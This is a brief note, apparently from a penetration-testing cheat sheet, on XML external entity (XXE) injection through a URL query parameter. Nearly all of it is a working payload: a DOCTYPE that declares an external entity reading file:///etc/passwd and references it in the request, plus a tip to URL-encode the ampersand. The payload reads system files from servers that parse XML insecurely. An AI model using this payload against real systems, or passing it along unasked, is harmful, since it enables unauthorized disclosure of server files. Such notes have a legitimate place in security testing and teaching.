### Where you can control an entity
example:  
`/?xml=<test>blah</test>`  

We describe the entity and then call it:
`/?xml=<!DOCTYPE test [<!ENTITY x SYSTEM "file:///etc/passwd">]><test>&x;</test>` # '`&`' must be URL encoded as `%26`
